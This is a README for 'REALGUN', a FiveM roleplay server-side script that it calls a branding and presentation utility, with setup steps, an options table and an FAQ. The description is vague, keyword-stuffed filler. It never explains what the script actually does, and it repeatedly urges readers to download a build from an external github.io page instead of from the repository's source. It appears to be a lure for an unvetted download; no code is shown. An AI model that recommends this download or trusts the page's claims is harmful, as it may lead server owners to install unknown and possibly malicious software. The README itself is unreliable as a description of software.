# REALGUN v2026 - Game Script Utility 2026

> **FiveM roleplay server utility for branding and presentation.** REALGUN is a server-side script-style package built for FiveM roleplay setups that want a cleaner presentation layer and basic branding support.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hayeszack62/realgun-server-side-script?style=flat-square)](https://github.com/hayeszack62/realgun-server-side-script)

---

<p align="center">
  <a href="https://hayeszack62.github.io/realgun-server-side-script/">
    <img src="https://img.shields.io/badge/Download-REALGUN%20Script-brightgreen?style=for-the-badge" alt="Download REALGUN Script">
  </a>
</p>

> **[Direct Download - REALGUN](https://hayeszack62.github.io/realgun-server-side-script/)**

---

[Download Latest Build](https://hayeszack62.github.io/realgun-server-side-script/)

---

## What it does

REALGUN targets FiveM roleplay environments where the way a server is presented matters just as much as the scripts behind it. It keeps the focus on branding-related setup details and a lightweight script flow that fits cleanly into server-side deployments without introducing extra complexity.

The package is aimed at roleplay server use and presentation support, giving owners a direct way to shape how their server setup appears. Its updates are meant to stay aligned with current FiveM roleplay expectations while keeping the structure simple and script-first.

## Script Features

- Server-side operation for FiveM roleplay setups
- Branding-focused presentation support
- Compact script-style package
- Built for roleplay server usage
- Designed around server utility workflows
- Suited for presentation-oriented server layouts
- Simple deployment model for server environments

## Setup

1. Download the latest build from the link above.
2. Place the folder into your server resources directory, using the suggested folder name if desired.
3. Add the resource to your server configuration.
4. Start or restart the resource after the rest of the server is ready.

Example:
- `ensure realgun-2026-server-script`

If your server uses a custom resource naming convention, update the folder and `ensure` line to match your setup.

## Options

What you can configure depends on how the script is bundled in your server build. In a standard deployment, you may see simple resource controls such as load order, branding placement, or presentation-oriented toggles.

| Option | Purpose | Example |
| --- | --- | --- |
| Resource name | Matches the folder and server config entry | `realgun-2026-server-script` |
| Start order | Defines when the script loads | `ensure realgun-2026-server-script` |
| Branding layout | Controls presentation placement | Server-defined |
| Server-side mode | Runs through the server resource system | Enabled by deployment |

## Compatibility

REALGUN is intended for FiveM roleplay servers. It is best suited to server-side resource deployments and presentation-focused setups.

Known limitations:
- Not intended as a general-purpose game utility outside FiveM
- Behavior depends on how the host server integrates the resource
- Configuration details may vary by server structure and resource order

## FAQ

### How do I install it?
Grab the package, copy it into your server resources, and add the resource name to your server configuration.

### Can I rename the folder?
Yes. If you rename the folder, make sure the server config uses the same name.

### Does it work with every FiveM server?
It is meant for FiveM roleplay environments, but compatibility depends on the server's resource layout and deployment approach.

### Can I customize it?
Yes, if your build exposes settings or server-side values, you can adjust them to fit your presentation needs.

### Where should it be stored?
Keep it inside your server resources directory, alongside the rest of your managed server scripts.

### How do I update it?
Replace the existing folder with the newer build, then restart the resource and verify the server config still points to the correct name.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
